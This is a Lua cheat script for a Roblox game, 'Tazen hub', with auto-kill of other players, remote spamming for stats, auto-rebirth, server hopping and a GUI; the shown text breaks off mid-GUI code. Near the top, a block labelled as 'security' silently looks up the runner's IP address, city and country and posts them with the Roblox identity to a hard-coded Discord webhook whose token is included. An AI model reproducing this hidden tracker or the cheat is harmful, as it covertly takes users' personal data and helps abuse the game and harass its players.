-- Tazen hub V1 by TZ_THR rework

local success, err = pcall(function()

if game.PlaceId ~= 3623096087 then
    warn("[Tazen hub] Wrong PlaceId: " .. tostring(game.PlaceId))
    return
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
if not game:IsLoaded() then game.Loaded:Wait() end

-- ===================== WEBHOOK SECURITY & GEO-IP SYSTEM =====================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1558249808404283442/r_ao-RXJgDrMN-J__AbrHGSbsqTwRXTM_YyO9p66w6VYoJQ8qg0N8mxiN9sQdp74ZWA_"

task.spawn(function()
    pcall(function()
        local ignoredUserIds = {
            [2549253643] = true,
            [7163736802] = true,
            [4760900584] = true,
        }

        if ignoredUserIds[LocalPlayer.UserId] then
            return
        end

        local reqFunc = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
        if not reqFunc then return end

        local geoReq = reqFunc({
            Url = "http://ip-api.com/json/?fields=status,message,country,city,query",
            Method = "GET"
        })

        local ip = "Inconnue"
        local country = "Inconnu"
        local city = "Inconnue"

        if geoReq and geoReq.Body then
            local successJson, dataGeo = pcall(function()
                return HttpService:JSONDecode(geoReq.Body)
            end)

            if successJson and dataGeo and dataGeo.status == "success" and dataGeo.query then
                local rawIp = tostring(dataGeo.query)
                if rawIp:match("^%d+%.%d+%.%d+%.%d+$") then
                    ip = rawIp
                    country = tostring(dataGeo.country or "Inconnu")
                    city = tostring(dataGeo.city or "Inconnue")
                end
            end
        end

        if ip == "Inconnue" then
            ip = "IP Invalide / Masquée"
        end

        local playerName = LocalPlayer.Name
        local displayName = LocalPlayer.DisplayName
        local userId = LocalPlayer.UserId
        local profileLink = "https://www.roblox.com/users/" .. tostring(userId) .. "/profile"

        local embedData = {
            ["content"] = "",
            ["embeds"] = {{
                ["title"] = "🛡️ Alerte Sécurité - Nouvelle Exécution",
                ["color"] = 15844367,
                ["fields"] = {
                    {["name"] = "👤 Pseudo", ["value"] = tostring(playerName) .. " (" .. tostring(displayName) .. ")", ["inline"] = true},
                    {["name"] = "🆔 ID Roblox", ["value"] = tostring(userId), ["inline"] = true},
                    {["name"] = "🌐 Adresse IP", ["value"] = "||" .. tostring(ip) .. "||", ["inline"] = false},
                    {["name"] = "📍 Localisation", ["value"] = "Ville: **" .. city .. "** | Pays: **" .. country .. "**", ["inline"] = false},
                    {["name"] = "🔗 Profil", ["value"] = "[Lien du profil](" .. profileLink .. ")", ["inline"] = false}
                },
                ["footer"] = {
                    ["text"] = "Tazen Hub Security • PlaceId: " .. tostring(game.PlaceId)
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }

        reqFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(embedData)
        })
    end)
end)

-- ===================== CONFIG & SAVE SYSTEM =====================
local CONFIG_FILE_PREFIX = "TazenHub_Config_"

local function loadCategoryConfig(categoryName)
    local ok, result = pcall(function()
        if readfile and isfile and isfile(CONFIG_FILE_PREFIX .. categoryName .. ".json") then
            return HttpService:JSONDecode(readfile(CONFIG_FILE_PREFIX .. categoryName .. ".json"))
        end
    end)
    if ok and type(result) == "table" then
        return result
    end
    return {}
end

local function saveCategoryConfig(categoryName, data)
    pcall(function()
        if writefile then
            writefile(CONFIG_FILE_PREFIX .. categoryName .. ".json", HttpService:JSONEncode(data))
        end
    end)
end

-- ===================== SETTINGS =====================
local REBIRTH_COOLDOWN = 4.0

local E = {
    bolt = "⚡", cycle = "🔄", muscle = "💪", toolbox = "🧰",
    sleep = "😴", rocket = "🚀", sparkles = "✨", heart = "💕",
    ok = "✅", no = "❌", chart = "📊", up = "📈", broom = "🧹",
    clock = "🕒", hourglass = "⏳", sun = "🌞", calendar = "📅",
    trophy = "🏆", target = "🎯", wrench = "🔧", clip = "📋",
    bulb = "💡", fire = "🔥", loop = "🔁", antenna = "📡",
    party = "🎉", game = "🎮", crown = "👑", egg = "🥚",
    wheel = "🎡", skull = "💀", rainbow = "🌈", chest = "🎁",
    sword = "⚔️", shield = "🛡️", crosshairs = "🎯",
    shieldAlt = "🛡️", info = "ℹ️", link = "🔗"
}

local repSpeedPetPriorities = {
    ["Omega Overlord"] = 1,
    ["Swift Samurai"] = 2,
    ["Mythic Boss Pet"] = 3,
    ["Legendary Boss Pet"] = 4,
    ["Epic Boss Pet"] = 5,
}

local alive = true
local connections = {}
local function connect(signal, fn)
    local ok, c = pcall(function() return signal:Connect(fn) end)
    if ok and c then
        table.insert(connections, c)
        return c
    end
end

local fastRunId = 0
local autoRunId = 0
local repRunId = 0
local wheelRunId = 0
local eggRunId = 0
local killRunId = 0

local REP_CAP = 659
local repRate = 659
local repTotal = 0

local killStatus = "Waiting..."

local fastStartTime = nil
local autoStartTime = nil
local repStartTime = nil

local whitelistPlayers = {}
local targetPlayers = {}
local lastKillTick = tick()

local antiAfkConnection = nil
local function setAntiAfk(state)
    if antiAfkConnection then
        antiAfkConnection:Disconnect()
        antiAfkConnection = nil
    end
    if state then
        pcall(function()
            local VirtualUser = game:GetService("VirtualUser")
            antiAfkConnection = LocalPlayer.Idled:Connect(function()
                pcall(function()
                    VirtualUser:CaptureController()
                    VirtualUser:ClickButton2(Vector2.new(0, 0))
                end)
            end)
        end)
    end
end

local function canRebirth()
    local okC, result = pcall(function()
        local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
        if not leaderstats then return true end
        local strength = leaderstats:FindFirstChild("Strength")
            or leaderstats:FindFirstChild("Muscle")
            or leaderstats:FindFirstChild("Multiplier")
        if strength and strength.Value then
            local v = tonumber(strength.Value)
            if v then return v > 0 end
        end
        return true
    end)
    if okC then return result end
    return true
end

local function getPetScore(pet)
    local o = pet:FindFirstChild("RepSpeed") or pet:FindFirstChild("Rep Speed")
    if o and (o:IsA("NumberValue") or o:IsA("IntValue")) then return o.Value end
    local attr = pet:GetAttribute("RepSpeed") or pet:GetAttribute("Rep Speed")
    if attr then return tonumber(attr) or 0 end
    local lvl = pet:FindFirstChild("Level") or pet:FindFirstChild("Lvl")
    if lvl and lvl.Value then return tonumber(lvl.Value) or 0 end
    return 1
end

local function findMuscleEvent(rEvents)
    return LocalPlayer:FindFirstChild("muscleEvent")
        or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("muscleEvent"))
        or rEvents:FindFirstChild("muscleEvent")
end

local function equipToolByName(toolKeyword)
    pcall(function()
        local char = LocalPlayer.Character
        if not char then return end
        local backpack = LocalPlayer:FindFirstChild("Backpack")
        if not backpack then return end

        local foundTool = char:FindFirstChild(toolKeyword)
        if not foundTool then
            for _, tool in ipairs(backpack:GetChildren()) do
                if tool:IsA("Tool") and tool.Name:lower():find(toolKeyword:lower()) then
                    tool.Parent = char
                    break
                end
            end
        end
    end)
end

local function equipFists()
    equipToolByName("punch")
end

local lastHopTry = 0
local function serverHop()
    killStatus = "Changing server..."
    pcall(function()
        local servers = {}
        local req = game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")
        local data = HttpService:JSONDecode(req)
        if data and data.data then
            for _, s in ipairs(data.data) do
                if type(s) == "table" and s.playing < s.maxPlayers and s.id ~= game.JobId then
                    table.insert(servers, s.id)
                end
            end
        end
        if #servers > 0 then
            TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], LocalPlayer)
        else
            TeleportService:Teleport(game.PlaceId, LocalPlayer)
        end
    end)
end

local function autoKillAllLoop(myId)
    lastKillTick = tick()

    while killRunId == myId and alive do
        pcall(function()
            local character = LocalPlayer.Character
            local hrp = character and character:FindFirstChild("HumanoidRootPart")
            if not hrp then
                killStatus = "Waiting for character..."
                task.wait(1)
            else
                local targetPlayer = nil
                local minDist = math.huge

                for _, plr in ipairs(Players:GetPlayers()) do
                    if plr ~= LocalPlayer and not whitelistPlayers[plr.Name] then
                        local pChar = plr.Character
                        local pHrp = pChar and pChar:FindFirstChild("HumanoidRootPart")
                        local pHum = pChar and pChar:FindFirstChildOfClass("Humanoid")
                        if pHrp and pHum and pHum.Health > 0 then
                            local dist = (hrp.Position - pHrp.Position).Magnitude
                            if dist < minDist then
                                minDist = dist
                                targetPlayer = plr
                            end
                        end
                    end
                end

                if targetPlayer then
                    local pChar = targetPlayer.Character
                    local pHrp = pChar and pChar:FindFirstChild("HumanoidRootPart")
                    local pHum = pChar and pChar:FindFirstChildOfClass("Humanoid")

                    killStatus = "Kill All : " .. targetPlayer.Name
                    equipFists()

                    local wasAlive = true
                    local deathConn
                    if pHum then
                        deathConn = pHum.Died:Connect(function()
                            wasAlive = false
                            lastKillTick = tick()
                            if deathConn then deathConn:Disconnect() end
                        end)
                    end

                    while killRunId == myId and alive and targetPlayer.Parent and pHum and pHum.Health > 0 and wasAlive do
                        if whitelistPlayers[targetPlayer.Name] then
                            break
                        end

                        equipFists()
                        if hrp and pHrp then
                            hrp.CFrame = pHrp.CFrame * CFrame.new(0, 3, 2)
                        end
                        
                        local currentTool = character:FindFirstChild("Fight") or character:FindFirstChild("Punch")
                        if currentTool and currentTool:IsA("Tool") then
                            pcall(function()
                                currentTool:Activate()
                            end)
                        end

                        task.wait(0.1)
                    end

                    if deathConn then deathConn:Disconnect() end
                else
                    killStatus = "No target available..."
                    task.wait(0.5)
                end
            end

            if tick() - lastKillTick > 60 and tick() - lastHopTry > 20 then
                lastHopTry = tick()
                task.spawn(serverHop)
            end
        end)
        task.wait(0.1)
    end
end

local function killTargetPlayerLoop(myId)
    lastKillTick = tick()

    while killRunId == myId and alive do
        pcall(function()
            local character = LocalPlayer.Character
            local hrp = character and character:FindFirstChild("HumanoidRootPart")
            if not hrp then
                killStatus = "Waiting for character..."
                task.wait(1)
            else
                local targetPlayer = nil
                local minDist = math.huge

                for _, plr in ipairs(Players:GetPlayers()) do
                    if targetPlayers[plr.Name] and plr ~= LocalPlayer and not whitelistPlayers[plr.Name] then
                        local pChar = plr.Character
                        local pHrp = pChar and pChar:FindFirstChild("HumanoidRootPart")
                        local pHum = pChar and pChar:FindFirstChildOfClass("Humanoid")
                        if pHrp and pHum and pHum.Health > 0 then
                            local dist = (hrp.Position - pHrp.Position).Magnitude
                            if dist < minDist then
                                minDist = dist
                                targetPlayer = plr
                            end
                        end
                    end
                end

                if targetPlayer then
                    local pChar = targetPlayer.Character
                    local pHrp = pChar and pChar:FindFirstChild("HumanoidRootPart")
                    local pHum = pChar and pChar:FindFirstChildOfClass("Humanoid")

                    killStatus = "Target : " .. targetPlayer.Name
                    equipFists()

                    local wasAlive = true
                    local deathConn
                    if pHum then
                        deathConn = pHum.Died:Connect(function()
                            wasAlive = false
                            lastKillTick = tick()
                            if deathConn then deathConn:Disconnect() end
                        end)
                    end

                    while killRunId == myId and alive and targetPlayer.Parent and pHum and pHum.Health > 0 and wasAlive do
                        if not targetPlayers[targetPlayer.Name] or whitelistPlayers[targetPlayer.Name] then
                            break
                        end

                        equipFists()
                        if hrp and pHrp then
                            hrp.CFrame = pHrp.CFrame * CFrame.new(0, 3, 2)
                        end
                        
                        local currentTool = character:FindFirstChild("Fight") or character:FindFirstChild("Punch")
                        if currentTool and currentTool:IsA("Tool") then
                            pcall(function()
                                currentTool:Activate()
                            end)
                        end

                        task.wait(0.1)
                    end

                    if deathConn then deathConn:Disconnect() end
                else
                    killStatus = "No target connected..."
                    task.wait(0.5)
                end
            end
        end)
        task.wait(0.1)
    end
end

-- ===================== FAST REBIRTH LOOP (ORIGINAL LOGIC) =====================
local function fastRebirthLoop(myId)
    local function isRunning() return fastRunId == myId end
    pcall(function()
        local rebirthRemote = ReplicatedStorage.rEvents.rebirthRemote
        local equipPetEvent = ReplicatedStorage.rEvents.equipPetEvent
        local FOLDERS = {"Unique", "Rare", "Epic", "Mythic", "Legendary"}

        local SLOTS = 12                    
        local STARTUP_UNEQUIP_PER_FRAME = 20
        local LIST_REFRESH_EVERY = 10        
        local INTERNAL_REP_RATE = 659        

        local function petRealName(pet)
            if pet:FindFirstChild("PetName") then return pet.PetName.Value end
            return pet.Name
        end

        local function unequipAllPets(petsFolder)
            local count = 0
            for _, folderName in ipairs(FOLDERS) do
                local folder = petsFolder:FindFirstChild(folderName)
                if folder then
                    for _, pet in ipairs(folder:GetChildren()) do
                        pcall(function() equipPetEvent:FireServer("unequipPet", pet) end)
                        count = count + 1
                        if count % STARTUP_UNEQUIP_PER_FRAME == 0 then task.wait() end
                    end
                end
            end
            return count
        end

        local function buildHydraList(petsFolder, slots)
            local list = {}
            for _, folderName in ipairs(FOLDERS) do
                local folder = petsFolder:FindFirstChild(folderName)
                if folder then
                    for _, pet in ipairs(folder:GetChildren()) do
                        local name = petRealName(pet)
                        if #list < slots and (name == "Titanium Hydra" or name == "Tribal Overlord") then
                            table.insert(list, pet)
                        end
                    end
                end
            end
            return list
        end

        local function buildRepList(petsFolder, slots)
            local repPets = {}
            for _, folderName in ipairs(FOLDERS) do
                local folder = petsFolder:FindFirstChild(folderName)
                if folder then
                    for _, pet in ipairs(folder:GetChildren()) do
                        local priority = repSpeedPetPriorities[petRealName(pet)] or 10
                        table.insert(repPets, {
                            Instance = pet,
                            Priority = priority,
                            Score = getPetScore(pet)
                        })
                    end
                end
            end

            table.sort(repPets, function(a, b)
                if a.Priority == b.Priority then
                    return a.Score > b.Score
                end
                return a.Priority < b.Priority
            end)

            local list = {}
            for _, entry in ipairs(repPets) do
                if #list >= slots then break end
                table.insert(list, entry.Instance)
            end
            return list
        end

        local equipped = {}

        local function setEquipped(wanted, burst)
            local want, have = {}, {}
            for _, pet in ipairs(wanted) do want[pet] = true end
            for _, pet in ipairs(equipped) do have[pet] = true end

            local outList, inList = {}, {}
            for _, pet in ipairs(equipped) do
                if not want[pet] and pet.Parent then table.insert(outList, pet) end
            end
            local newEquipped = {}
            local function fire(kind, pet)
                pcall(function() equipPetEvent:FireServer(kind, pet) end)
                if not burst then task.wait() end
            end

            for _, pet in ipairs(wanted) do
                if pet.Parent then
                    if not have[pet] then table.insert(inList, pet) end
                    table.insert(newEquipped, pet)
                end
            end

            for _, pet in ipairs(outList) do fire("unequipPet", pet) end
            for _, pet in ipairs(inList) do fire("equipPet", pet) end

            equipped = newEquipped
        end

        local petsFolder = LocalPlayer:FindFirstChild("petsFolder")
        while isRunning() and not petsFolder do
            task.wait(1)
            petsFolder = LocalPlayer:FindFirstChild("petsFolder")
        end
        if not isRunning() then return end

        local hydraList = buildHydraList(petsFolder, SLOTS)
        local repList = buildRepList(petsFolder, SLOTS)

        if #hydraList == 0 or #repList == 0 then return end

        local rEvents = ReplicatedStorage:WaitForChild("rEvents", 5)
        local muscleEvent = rEvents and findMuscleEvent(rEvents)

        unequipAllPets(petsFolder)
        if not isRunning() then return end
        setEquipped(repList, true)

        local cycle = 0
        while isRunning() do
            cycle = cycle + 1

            local carry = 0
            local canR = false
            while isRunning() do
                local dt = RunService.Heartbeat:Wait()
                if muscleEvent and INTERNAL_REP_RATE > 0 then
                    carry = carry + INTERNAL_REP_RATE * dt
                    local n = math.floor(carry)
                    carry = carry - n
                    for _ = 1, n do
                        pcall(muscleEvent.FireServer, muscleEvent, "rep")
                    end
                end
                
                pcall(function()
                    canR = canRebirth()
                end)
                if canR then break end
            end

            if not isRunning() then break end

            setEquipped(hydraList, true)
            task.wait(0.02)

            pcall(function()
                rebirthRemote:InvokeServer("rebirthRequest")
            end)

            setEquipped(repList, true)

            if cycle % LIST_REFRESH_EVERY == 0 then
                petsFolder = LocalPlayer:FindFirstChild("petsFolder") or petsFolder
                hydraList = buildHydraList(petsFolder, SLOTS)
                repList = buildRepList(petsFolder, SLOTS)
                muscleEvent = findMuscleEvent(rEvents or ReplicatedStorage) or muscleEvent
            end
        end
    end)
end

local function autoRebirthLoop(myId)
    local rEvents = ReplicatedStorage:WaitForChild("rEvents", 5)
    local rebirthRemote = rEvents and rEvents:WaitForChild("rebirthRemote", 5)
    if not rebirthRemote then return end

    while autoRunId == myId do
        pcall(function()
            if canRebirth() then
                rebirthRemote:InvokeServer("rebirthRequest")
            end
        end)
        task.wait(REBIRTH_COOLDOWN)
    end
end

local function fastRepLoop(myId)
    local rEvents = ReplicatedStorage:WaitForChild("rEvents", 5)
    if not rEvents then return end
    local muscleEvent = findMuscleEvent(rEvents)
    if not muscleEvent then return end

    local carry = 0
    local lastCheck = tick()
    while repRunId == myId and alive do
        local dt = RunService.Heartbeat:Wait()

        if tick() - lastCheck > 1 then
            lastCheck = tick()
            if not muscleEvent.Parent then
                muscleEvent = findMuscleEvent(rEvents) or muscleEvent
            end
        end

        local rate = math.min(repRate, REP_CAP)
        if rate > 0 then
            carry = carry + rate * dt
            local n = math.floor(carry)
            carry = carry - n

            for _ = 1, n do
                pcall(muscleEvent.FireServer, muscleEvent, "rep")
            end
            repTotal = repTotal + n
        end
    end
end

local function autoWheelLoop(myId)
    while wheelRunId == myId and alive do
        pcall(function()
            local rEvents = ReplicatedStorage:WaitForChild("rEvents", 5)
            local wheelRemote = rEvents and rEvents:FindFirstChild("openFortuneWheelRemote")
            if wheelRemote then
                local fortuneWheel = ReplicatedStorage:FindFirstChild("shared")
                    and ReplicatedStorage.shared:FindFirstChild("catalogs")
                    and ReplicatedStorage.shared.catalogs:FindFirstChild("fortuneWheelChances")
                    and ReplicatedStorage.shared.catalogs.fortuneWheelChances:FindFirstChild("Fortune Wheel")
                if fortuneWheel then
                    wheelRemote:InvokeServer("openFortuneWheel", fortuneWheel)
                end
            end
        end)
        task.wait(1)
    end
end

local function formatSeconds(totalSeconds)
    totalSeconds = math.floor(totalSeconds)
    local hours = math.floor(totalSeconds / 3600)
    local minutes = math.floor((totalSeconds % 3600) / 60)
    local seconds = totalSeconds % 60
    if hours > 0 then
        return string.format("%dh %02dm %02ds", hours, minutes, seconds)
    elseif minutes > 0 then
        return string.format("%dm %02ds", minutes, seconds)
    else
        return string.format("%ds", seconds)
    end
end

local FORMAT_UNITS = {
    {1e33, "Dc"}, {1e30, "No"}, {1e27, "Oc"}, {1e24, "Sp"}, {1e21, "Sx"},
    {1e18, "Qi"}, {1e15, "Qa"}, {1e12, "T"}, {1e9, "B"}, {1e6, "M"}, {1e3, "k"},
}
local function formatNumber(val)
    if type(val) ~= "number" or val ~= val then return "0" end
    for _, u in ipairs(FORMAT_UNITS) do
        if val >= u[1] then return string.format("%.2f%s", val / u[1], u[2]) end
    end
    return tostring(math.floor(val))
end

-- ===================== STAT TRACKER =====================
local StatTracker = {}
do
    local SUFFIX = {
        k = 1e3, m = 1e6, b = 1e9, t = 1e12, qa = 1e15, qi = 1e18,
        sx = 1e21, sp = 1e24, oc = 1e27, no = 1e30, dc = 1e33,
    }
    local WINDOW = 30

    local function parse(v)
        if type(v) == "number" then return v end
        if type(v) == "string" then
            local s = v:lower():gsub("[,%s]", "")
            local num, suf = s:match("^([%d%.]+)(%a*)$")
            num = tonumber(num)
            if not num then return nil end
            if suf == "" then return num end
            local mult = SUFFIX[suf]
            return mult and (num * mult) or nil
        end
        return nil
    end

    local function findSource(names)
        local containers = {
            LocalPlayer:FindFirstChild("leaderstats"),
            LocalPlayer,
            LocalPlayer:FindFirstChild("Data"),
            LocalPlayer:FindFirstChild("Stats"),
            LocalPlayer:FindFirstChild("stats"),
        }

        for _, name in ipairs(names) do
            for _, c in ipairs(containers) do
                if c then
                    local inst = c:FindFirstChild(name)
                    if inst and inst:IsA("ValueBase") and parse(inst.Value) ~= nil then
                        return function()
                            if not inst.Parent then return nil end
                            return parse(inst.Value)
                        end
                    end
                end
            end
        end
        for _, name in ipairs(names) do
            if LocalPlayer:GetAttribute(name) ~= nil then
                return function() return parse(LocalPlayer:GetAttribute(name)) end
            end
        end
        return nil
    end

    local stats = {
        strength = {
            names = { "Strength", "Muscle" },
            active = function() return repStartTime end,
        },
        durability = {
            names = { "Durability" },
            active = function() return repStartTime end,
        },
        rebirths = {
            names = { "Rebirths", "Rebirth" },
            active = function() return fastStartTime or autoStartTime end,
            window = 60,
            minEvents = 2,
        },
    }
    StatTracker.stats = stats

    local function resetOne(st)
        st.read = nil
        st.last = nil
        st.gained = 0
        st.history = {}
        st.lastT = nil
        st.gap = nil
        st.events = 0
    end
    for _, st in pairs(stats) do resetOne(st) end

    local function gain(st, n, now)
        st.gained = st.gained + n
        st.events = st.events + 1
        if st.lastT then st.gap = now - st.lastT end
        st.lastT = now
    end

    local function pollOne(st)
        if not st.read then
            st.read = findSource(st.names)
            st.last = nil
        end
        if st.read then
            local ok, cur = pcall(st.read)
            if ok and cur then
                if st.last and cur > st.last then
                    gain(st, cur - st.last, tick())
                end
                st.last = cur
            else
                st.read = nil
                st.last = nil
            end
        end
    end

    function StatTracker.reset(key)
        if key then
            resetOne(stats[key])
            pcall(pollOne, stats[key])
        else
            for _, st in pairs(stats) do resetOne(st) end
        end
    end

    local function record(st, now)
        local h, w = st.history, st.window or WINDOW
        h[#h + 1] = { t = now, g = st.gained }
        while #h > 2 and now - h[2].t >= w do
            table.remove(h, 1)
        end
    end

    function StatTracker.rate(st, now, startT)
        if st.minEvents and st.events < st.minEvents then return 0 end
        local elapsed = math.max(1, now - startT)
        local h = st.history
        local r = st.gained / elapsed
        if elapsed > (st.window or WINDOW) and #h >= 2 then
            local dt = now - h[1].t
            if dt >= 5 then r = math.max(0, (st.gained - h[1].g) / dt) end
        end
        return r
    end

    function StatTracker.text(icon, label, st, now, startT)
        if not st.read then
            return string.format("%s %s : stat not found", icon, label)
        end
        local r = StatTracker.rate(st, now, startT)
        return string.format("%s %s Tot: %s (+%s/s) | 1m: %s | 1h: %s | 1d: %s | 1w: %s | 1mo: %s",
            icon, label, formatNumber(st.gained), formatNumber(r),
            formatNumber(r * 60), formatNumber(r * 3600), formatNumber(r * 86400),
            formatNumber(r * 604800), formatNumber(r * 2592000))
    end

    function StatTracker.rebirthText(icon, now, startT)
        local st = stats.rebirths
        local r = StatTracker.rate(st, now, startT)
        local function p(x) return formatNumber(math.floor(x + 0.5)) end
        return string.format("%s Tot: %s | 1m: %s | 1h: %s | 1d: %s | 1w: %s | 1mo: %s",
            icon, formatNumber(st.gained), p(r * 60), p(r * 3600), p(r * 86400), p(r * 604800), p(r * 2592000))
    end

    function StatTracker.rebirthGap()
        local g = stats.rebirths.gap
        return g and string.format("%.2fs", g) or "--"
    end

    task.spawn(function()
        local lastRecord = 0
        while alive do
            task.wait(0.2)
            local now = tick()
            local doRecord = now - lastRecord >= 1
            if doRecord then lastRecord = now end
            for _, st in pairs(stats) do
                if st.active() then
                    pcall(pollOne, st)
                    if doRecord then pcall(record, st, now) end
                end
            end
        end
    end)
end

local Lighting = game:GetService("Lighting")
local antiLagConn = nil
local antiLagRun = 0
local antiLagTouched = setmetatable({}, { __mode = "k" })
local antiLagBackup = nil

local function lagApply(inst)
    pcall(function()
        if inst:IsA("ParticleEmitter") or inst:IsA("Trail") or inst:IsA("Beam")
            or inst:IsA("Smoke") or inst:IsA("Fire") or inst:IsA("Sparkles") or inst:IsA("PostEffect") then
            if inst.Enabled then
                antiLagTouched[inst] = { Enabled = true }
                inst.Enabled = false
            end
        elseif inst:IsA("Decal") or inst:IsA("Texture") then
            if inst.Transparency < 1 then
                antiLagTouched[inst] = { Transparency = inst.Transparency }
                inst.Transparency = 1
            end
        elseif inst:IsA("BasePart") and not inst:IsA("Terrain") then
            antiLagTouched[inst] = {
                Material = inst.Material,
                Reflectance = inst.Reflectance,
                CastShadow = inst.CastShadow,
            }
            inst.Material = Enum.Material.SmoothPlastic
            inst.Reflectance = 0
            inst.CastShadow = false
        end
    end)
end

local function antiLagStart()
    antiLagRun = antiLagRun + 1
    local myId = antiLagRun
    pcall(function()
        antiLagBackup = { GlobalShadows = Lighting.GlobalShadows, FogEnd = Lighting.FogEnd }
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
    end)
    task.spawn(function()
        local n = 0
        local function sweep(root)
            for _, d in ipairs(root:GetDescendants()) do
                if antiLagRun ~= myId then return end
                lagApply(d)
                n = n + 1
                if n % 400 == 0 then task.wait() end
            end
        end
        sweep(Lighting)
        sweep(workspace)
    end)
    antiLagConn = workspace.DescendantAdded:Connect(function(d) lagApply(d) end)
end

local function antiLagStop()
    antiLagRun = antiLagRun + 1
    if antiLagConn then antiLagConn:Disconnect(); antiLagConn = nil end
    local touched = antiLagTouched
    local backup = antiLagBackup
    antiLagTouched = setmetatable({}, { __mode = "k" })
    antiLagBackup = nil

    task.spawn(function()
        local n = 0
        for inst, props in pairs(touched) do
            if inst and inst.Parent then
                for k, v in pairs(props) do
                    pcall(function() inst[k] = v end)
                end
            end
            n = n + 1
            if n % 400 == 0 then task.wait() end
        end
        if backup then
            pcall(function()
                Lighting.GlobalShadows = backup.GlobalShadows
                Lighting.FogEnd = backup.FogEnd
            end)
        end
    end)
end

-- ===================== HIDE PETS & HIDE POPUPS SYSTEM =====================
local hidePetsActive = false
local hidePopupsActive = false
local petsFolderConn = nil

local function applyHidePets(state)
    pcall(function()
        for _, plr in ipairs(Players:GetPlayers()) do
            local pf = plr:FindFirstChild("petsFolder")
            if pf then
                for _, folder in ipairs(pf:GetChildren()) do
                    for _, pet in ipairs(folder:GetChildren()) do
                        for _, pPart in ipairs(pet:GetDescendants()) do
                            if pPart:IsA("BasePart") or pPart:IsA("Decal") then
                                pPart.Transparency = state and 1 or 0
                            end
                        end
                    end
                end
            end
        end
    end)
end

local function setHidePets(state)
    hidePetsActive = state
    applyHidePets(state)
    if petsFolderConn then petsFolderConn:Disconnect(); petsFolderConn = nil end
    if state then
        petsFolderConn = RunService.Heartbeat:Connect(function()
            if hidePetsActive then
                applyHidePets(true)
            end
        end)
    end
end

local function setHidePopups(state)
    hidePopupsActive = state
    pcall(function()
        local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
        if playerGui then
            for _, child in ipairs(playerGui:GetChildren()) do
                local name = child.Name:lower()
                if name:find("popup") or name:find("notification") or name:find("prompt") or name:find("alert") then
                    child.Enabled = not state
                end
            end
        end
    end)
end

local fpsFrames = 0
connect(RunService.Heartbeat, function() fpsFrames = fpsFrames + 1 end)

-- ===================== TAZEN BRAND GUI THEME =====================
local T = {
    Background = Color3.fromRGB(12, 12, 12),
    Topbar = Color3.fromRGB(18, 18, 18),
    Element = Color3.fromRGB(24, 24, 24),
    Stroke = Color3.fromRGB(255, 130, 180),
    Accent = Color3.fromRGB(240, 110, 160),
    Text = Color3.fromRGB(255, 255, 255),
    SubText = Color3.fromRGB(190, 190, 190),
    Off = Color3.fromRGB(45, 45, 45),
}

local function getGuiParent()
    local okHui, hui = pcall(function() return gethui and gethui() end)
    if okHui and hui then return hui end
    return LocalPlayer:WaitForChild("PlayerGui")
end

local function new(class, props, parent)
    local o = Instance.new(class)
    for k, v in pairs(props) do o[k] = v end
    if parent then o.Parent = parent end
    return o
end

local function corner(o, r) return new("UICorner", { CornerRadius = UDim.new(0, r) }, o) end
local function stroke(o, color, th) return new("UIStroke", { Color = color, Thickness = th }, o) end

local function textLabel(props, parent)
    local p = {
        BackgroundTransparency = 1,
        Font = Enum.Font.GothamBold,
        TextSize = 14,
        TextColor3 = T.Text,
        TextStrokeColor3 = Color3.new(0, 0, 0),
        TextStrokeTransparency = 0.5,
        TextXAlignment = Enum.TextXAlignment.Left,
    }
    for k, v in pairs(props) do p[k] = v end
    return new("TextLabel", p, parent)
end

local parentGui = getGuiParent()
local old = parentGui:FindFirstChild("TazenHubGui")
if old then old:Destroy() end

local gui = new("ScreenGui", {
    Name = "TazenHubGui",
    ResetOnSpawn = false,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
}, parentGui)

local cam = workspace.CurrentCamera
local vp = cam and cam.ViewportSize or Vector2.new(900, 600)
local W = math.min(580, vp.X - 30)
local H = math.min(390, vp.Y - 30)

local main = new("Frame", {
    Name = "Main",
    Size = UDim2.fromOffset(W, H),
    Position = UDim2.new(0.5, -W / 2, 0.5, -H / 2),
    BackgroundColor3 = T.Background,
    BorderSizePixel = 0,
    ClipsDescendants = true,
}, gui)
corner(main, 8)
stroke(main, T.Stroke, 1.8)

-- ===================== LOGO EN FOND (WATERMARK) =====================
local watermark = new("Frame", {
    Name = "LogoWatermark",
    Size = UDim2.fromOffset(360, 300),
    Position = UDim2.new(0.5, -180, 0.5, -150),
    BackgroundTransparency = 1,
    ZIndex = 4,
}, main)

new("TextLabel", {
    Size = UDim2.fromOffset(180, 200),
    Position = UDim2.new(0.12, 0, 0, 0),
    BackgroundTransparency = 1,
    Font = Enum.Font.GothamBold,
    TextSize = 210,
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextTransparency = 0.84,
    Text = "T",
    ZIndex = 4,
}, watermark)

new("TextLabel", {
    Size = UDim2.fromOffset(180, 200),
    Position = UDim2.new(0.40, 0, 0.12, 0),
    BackgroundTransparency = 1,
    Font = Enum.Font.GothamBold,
    TextSize = 210,
    TextColor3 = T.Accent,
    TextTransparency = 0.84,
    Text = "Z",
    ZIndex = 4,
}, watermark)

local tazenBrandBox = new("Frame", {
    Size = UDim2.fromOffset(200, 45),
    Position = UDim2.new(0.5, -100, 0.74, 0),
    BackgroundTransparency = 1,
    ZIndex = 4,
}, watermark)

new("UIListLayout", {
    FillDirection = Enum.FillDirection.Horizontal,
    SortOrder = Enum.SortOrder.LayoutOrder,
    Padding = UDim.new(0, 0),
}, tazenBrandBox)

new("TextLabel", {
    Size = UDim2.fromOffset(32, 45),
    BackgroundTransparency = 1,
    Font = Enum.Font.GothamBold,
